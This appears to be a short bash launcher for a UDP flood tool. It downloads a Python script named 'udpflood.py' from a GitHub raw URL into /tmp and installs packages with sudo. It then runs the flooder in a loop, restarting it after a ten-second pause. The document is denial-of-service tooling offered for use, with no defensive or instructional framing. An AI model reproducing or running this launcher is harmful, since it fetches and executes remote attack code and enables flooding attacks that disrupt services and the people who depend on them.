#!/bin/bash
clear
wget -O /tmp/uwu.py 'https://raw.githubusercontent.com/XaviFortes/Python-UDP-Flood/master/udpflood.py'
chmod +x /tmp/uwu.py
sudo yum -y install epel-release
sudo yum -y install snapd python3 python
sudo apt-get -y install python38
sudo systemctl enable --now snapd.socket
sudo ln -s /var/lib/snapd/snap /snap
sudo yum -y update
sudo yum -y upgrade
sudo snap install figlet
sudo yum -y install figlet
cd /tmp
clear
while true; do
    clear
    python3 uwu.py
    case $? in
    130) break ;;
    esac
    clear
    figlet Hit another time Ctrl + C to exit -f slant
    figlet You have 10 seconds -f smslant
    sleep 10
done
clear
